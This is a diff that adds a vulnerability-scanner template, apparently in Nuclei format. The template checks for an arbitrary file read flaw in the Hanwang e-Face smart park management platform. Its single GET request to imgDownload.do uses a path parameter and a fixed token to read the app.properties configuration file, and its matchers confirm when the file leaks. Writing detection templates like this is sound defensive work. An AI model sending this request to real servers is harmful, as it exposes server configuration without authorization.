@@ -1,0 +1,29 @@
+id: poc-yaml-hw-e-face-pass-spmp-imgdownload-do-anyfile-read
+
+info:
+  name: 汉王e脸通智慧园区管理平台 imgDownload.do 任意文件读取漏洞
+  author: ProjectDiscoveryAI
+  severity: high
+  tags: file-read
+  description: |
+    This template detects an arbitrary file read vulnerability in the 汉王e脸通智慧园区管理平台 through the imgDownload.do endpoint.
+
+http:
+  - method: GET
+    path:
+      - "{{BaseURL}}/manage/resourceUpload/imgDownload.do?filePath=/manage/WEB-INF/classes/app.properties&recoToken=ZuZBOrvLG8M"
+    matchers-condition: and
+    matchers:
+      - type: status
+        status:
+          - 200
+      - type: word
+        part: body
+        words:
+          - "是否开启调试模式"
+          - "server.version="
+          - "server.url="
+      - type: word
+        part: header
+        words:
+          - "image"
